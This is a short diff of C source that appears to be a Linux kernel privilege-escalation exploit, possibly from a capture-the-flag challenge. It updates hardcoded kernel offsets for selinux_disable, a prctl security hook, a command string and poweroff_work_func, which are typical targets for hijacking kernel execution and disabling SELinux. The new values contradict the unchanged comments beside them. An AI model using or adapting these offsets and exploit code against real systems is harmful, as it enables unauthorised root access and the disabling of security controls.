@@ -109,9 +109,9 @@ int main()
 	struct realloc_args rello_args;
 
 	size_t kernel_base=0;
-    size_t selinux_disable_addr = 0x3607f0;   //ffffffff813607f0 T selinux_disable   - 0xffffffff81000000(vmmap) =0x3607f0
-    size_t prctl_hook=0xe9bcd8;             // 0xffffffff81e9bcc0+0x18=0xffffffff81e9bcd8 - 0xffffffff81000000=0xe9bcd8
-    size_t order_cmd=0xe4cf40;       //mov    rdi,0xffffffff81e4cf40
+    size_t selinux_disable_addr = 0x349e10;   //ffffffff813607f0 T selinux_disable   - 0xffffffff81000000(vmmap) =0x3607f0
+    size_t prctl_hook=0x33e8a0;             // 0xffffffff81e9bcc0+0x18=0xffffffff81e9bcd8 - 0xffffffff81000000=0xe9bcd8
+    size_t order_cmd=0x0a2900;       //mov    rdi,0xffffffff81e4cf40
     size_t poweroff_work_addr=0xa7590; // ffffffff810a7590 t poweroff_work_func
 	
 	setvbuf(stdout, 0LL, 2, 0LL);
